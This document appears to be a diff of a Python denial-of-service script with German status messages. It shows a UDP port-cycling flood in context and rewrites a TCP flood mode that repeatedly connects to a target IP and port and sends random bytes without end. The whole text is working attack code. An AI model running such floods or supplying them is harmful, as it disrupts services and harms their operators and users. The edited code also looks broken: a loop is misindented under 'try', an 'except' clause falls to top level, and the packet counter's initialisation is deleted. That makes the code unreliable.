@@ -37,24 +37,22 @@ if method == "1":
         port = port + 1 if port < 65534 else 1
         print(f"Gesendet {sent} Pakete an {ip} über Port {port}")
 
+
 elif method == "2":
+
     # TCP Flood
     print("Starte TCP-Flood...")
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sent = 0
     try:
-        while True:
-            try:
-                sock.connect((ip, port))
-                sock.send(random._urandom(1024))
-                sent += 1
-                print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
-            except Exception as e:
-                print(f"Verbindung fehlgeschlagen: {e}")
-                break
-    except KeyboardInterrupt:
-        sock.close()
-        print("TCP-Flood beendet.")
-
-else:
-    print("Ungueltige Auswahl. Das Programm wird beendet.")
+    while True:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            sock.connect((ip, port))
+            sock.send(random._urandom(1024))
+            sent += 1
+            print(f"Gesendet {sent} TCP-Pakete an {ip} über Port {port}")
+        except Exception as e:
+            print(f"Verbindung fehlgeschlagen: {e}")
+        finally:
+            sock.close()
+except KeyboardInterrupt:
+    print("TCP-Flood beendet.")
